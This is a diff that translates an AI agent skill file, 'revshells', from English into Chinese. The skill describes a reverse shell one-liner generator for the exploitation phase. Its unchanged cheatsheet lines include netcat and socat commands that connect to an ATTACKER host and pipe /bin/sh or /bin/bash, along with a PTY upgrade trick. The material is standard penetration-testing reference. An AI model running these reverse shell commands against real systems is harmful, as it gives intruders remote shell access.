@@ -1,26 +1,23 @@
 ---
 name: revshells
 description: >
-  This skill should be used when the user asks about "revshells", "quickly
-  generating encoded reverse shell payloads for bash, Python, PowerShell, PHP,
-  and other languages during exploitation". Reverse shell one-liner generator
-  (web UI and CLI) supporting 50+ shells.
+  此技能适用于用户询问关于"revshells"、"快速生成 bash、Python、PowerShell、PHP 等语言的编码反弹 shell 载荷"、"利用阶段的反弹 shell 一行命令生成"。反弹 shell 一行命令生成器（Web UI 和 CLI），支持 50+ 种 shell。
 ---
 
 # RevShells
 
-Reverse shell one-liner generator — 50+ shells, encoded variants, web UI at revshells.com.
+反弹 shell 一行命令生成器 — 50+ 种 shell、编码变体，Web UI 位于 revshells.com。
 
-## Quick Start
+## 快速开始
 
 ```
 # Web UI: https://revshells.com
-# Enter: IP, Port, Shell type → Copy one-liner
+# 填写：IP、端口、Shell 类型 → 复制一行命令
 
-# Popular one-liners (substitute IP/PORT):
+# 常用一行命令（替换 IP/PORT）：
 ```
 
-## Shell Cheatsheet
+## Shell 速查表
 
 ```bash
 # Bash
@@ -43,15 +40,15 @@ nc ATTACKER PORT | /bin/sh | nc ATTACKER PORT2
 socat tcp:ATTACKER:PORT exec:'/bin/bash',pty,stderr,setsid,sigint,sane
 ```
 
-## Upgrade Shell to PTY
+## 升级 Shell 为 PTY
 
 ```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 # Ctrl+Z → stty raw -echo; fg → export TERM=xterm
 ```
 
-## Resources
+## 资源文件
 
-| File | When to load |
-|------|--------------|
-| `references/` | Encoded variants and PTY upgrade techniques |
+| 文件 | 加载时机 |
+|------|----------|
+| `references/` | 编码变体与 PTY 升级技术 |
